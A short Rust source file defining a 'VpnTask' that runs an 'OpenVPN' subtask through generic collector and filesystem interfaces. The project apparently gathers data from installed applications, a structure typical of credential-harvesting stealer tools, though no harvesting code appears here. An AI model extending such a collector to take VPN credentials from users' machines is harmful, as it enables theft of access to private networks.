#![no_std]

extern crate alloc;
mod openvpn;

use crate::alloc::borrow::ToOwned;

use crate::openvpn::OpenVPN;
use alloc::vec;
use collector::Collector;
use filesystem::FileSystem;
use tasks::Task;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask};

pub struct VpnTask<C: Collector, F: FileSystem> {
    inner: CompositeTask<C, F>
}

impl<C: Collector, F: FileSystem> Default for VpnTask<C, F> {
    fn default() -> Self {
        Self {
            inner: composite_task!(
                OpenVPN
            )
        }
    }
}

impl_composite_task_runner!(VpnTask<C, F>, "Vpn");
